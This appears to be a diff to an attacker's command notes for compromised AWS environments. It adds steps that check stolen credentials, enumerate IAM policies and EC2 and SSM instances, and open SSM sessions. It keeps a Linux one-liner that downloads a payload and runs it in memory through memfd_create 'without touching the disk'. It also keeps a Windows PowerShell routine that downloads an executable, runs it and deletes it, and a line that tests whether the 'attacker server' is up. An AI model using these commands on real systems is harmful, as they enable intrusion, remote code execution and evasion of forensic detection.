@@ -1,7 +1,17 @@
 # Linux SSM command
+    # connect to SSM session
+    export AWS_ACCESS_KEY_ID=""
+    export AWS_SECRET_ACCESS_KEY=""
+    aws sts get-caller-identity
+    aws iam list-attached-user-policies --user-name [THEIR_NAME] # try
+    aws ec2 describe-instances --query "Reservations[].Instances[].{ID:InstanceId,Name:Tags[?Key=='Name']|[0].Value}"
+    aws ssm describe-instance-information --query "InstanceInformationList[].{InstanceId:InstanceId,Status:PingStatus,OS:PlatformName}"
+    aws ssm start-session --target i-0123456789abcdef0
+
 # Download and execute without touching the disk
-## edit url
-curl -fsSL https://your-distro.cloudfront.net/updates/update | perl -e '
+
+# edit url
+curl -fsSL https://your-distro.cloudfront.net/updates/update | perl -e ' 
     $name = "in_memory_update";
     $fd = syscall(319, $name, 1); # 319 is memfd_create
     open($fh, ">&=$fd");
@@ -11,7 +21,7 @@ curl -fsSL https://your-distro.cloudfront.net/updates/update | perl -e '
 
 # Windows SSM command
 ## edit url
-$url = "https://your-distro.cloudfront.net/updates/update.exe"
+$url = "https://your-distro.cloudfront.net/updates/update.exe" # edit url
 $path = "$env:TEMP\update.exe"
 
 # 1. Download
@@ -20,8 +30,8 @@ Invoke-WebRequest -Uri $url -OutFile $path
 # 2. Execute
 Start-Process -FilePath $path -Wait
 
-# 3. Clean up (GTIG compliance: leave no trace)
+# 3. Clean up
 Remove-Item -Path $path
 
 #testing if attacker server is up and running 
-curl -X POST --data-binary "test" [cloudfront-distro.net]/api/v1/telemetry/update
+curl -X POST --data-binary "test" [cloudfront-distro.net]/api/v1/telemetry/update #edit cdn url
